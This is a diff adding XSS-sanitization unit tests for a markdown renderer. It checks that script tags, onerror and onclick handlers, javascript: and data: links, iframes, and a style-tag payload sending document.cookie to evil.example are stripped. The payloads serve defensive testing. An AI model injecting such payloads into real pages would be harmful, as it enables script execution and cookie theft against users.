@@ -31,6 +31,77 @@ describe("renderMarkdown", () => {
     expect(html).toContain("<th>a</th>");
     expect(html).toContain("<td>1</td>");
   });
+
+  test("preserves the language-X class and data-language attr for fenced code", () => {
+    const html = renderMarkdown("```js\nconst a = 1;\n```\n");
+    expect(html).toContain('<pre data-language="js"><code class="language-js">');
+  });
+});
+
+describe("renderMarkdown — XSS sanitization", () => {
+  // marked v9 passes raw HTML in markdown straight through. Without a post-
+  // render sanitizer, anything in this block would execute when the rendered
+  // page is loaded. Each test confirms one common vector is neutralized.
+
+  test("strips raw <script> tags", () => {
+    const html = renderMarkdown("hello\n\n<script>window.x = 1</script>\n");
+    expect(html).not.toContain("<script");
+    expect(html).not.toContain("window.x");
+  });
+
+  test("strips event-handler attributes on inline elements (e.g. <img onerror>)", () => {
+    const html = renderMarkdown('![alt](https://example.com/x.png)\n\n<img src="x" onerror="alert(1)">\n');
+    // The ![] form yields a clean <img> with allowed attrs.
+    expect(html).toContain("<img");
+    // Neither the inline nor the markdown-derived img should retain onerror.
+    expect(html).not.toContain("onerror");
+    expect(html).not.toContain("alert(1)");
+  });
+
+  test("strips javascript: URLs from markdown links", () => {
+    const html = renderMarkdown("[click](javascript:alert(1))\n");
+    expect(html).not.toContain("javascript:");
+    expect(html).not.toContain("alert(1)");
+  });
+
+  test("strips data: URLs from markdown links (only http/https/mailto allowed)", () => {
+    const html = renderMarkdown("[click](data:text/html,<script>alert(1)</script>)\n");
+    expect(html).not.toContain("data:");
+    expect(html).not.toContain("<script");
+  });
+
+  test("strips <iframe> tags", () => {
+    const html = renderMarkdown("hello\n\n<iframe src=\"https://evil.example\"></iframe>\n");
+    expect(html).not.toContain("<iframe");
+    expect(html).not.toContain("evil.example");
+  });
+
+  test("strips <style> tags (CSS-based exfiltration vector)", () => {
+    const html = renderMarkdown("hello\n\n<style>body { background: url('https://evil.example/'+document.cookie) }</style>\n");
+    expect(html).not.toContain("<style");
+    expect(html).not.toContain("evil.example");
+  });
+
+  test("escapes raw HTML inside fenced code blocks (marked already does this; regression guard)", () => {
+    const html = renderMarkdown("```\n<script>alert(1)</script>\n```\n");
+    // Raw < and > inside a code block must be entity-encoded so the browser
+    // shows them as text, not as executable markup.
+    expect(html).toContain("&lt;script&gt;");
+    expect(html).not.toMatch(/<script[^&]/);
+  });
+
+  test("strips inline event handlers on otherwise-allowed tags", () => {
+    const html = renderMarkdown('<a href="https://example.com" onclick="alert(1)">link</a>\n');
+    expect(html).toContain('href="https://example.com"');
+    expect(html).not.toContain("onclick");
+    expect(html).not.toContain("alert(1)");
+  });
+
+  test("strips arbitrary classes (only language-X on <code> is allowed)", () => {
+    const html = renderMarkdown('<p class="evil-class">hello</p>\n');
+    expect(html).toContain("hello");
+    expect(html).not.toContain("evil-class");
+  });
 });
 
 describe("locateQuote", () => {
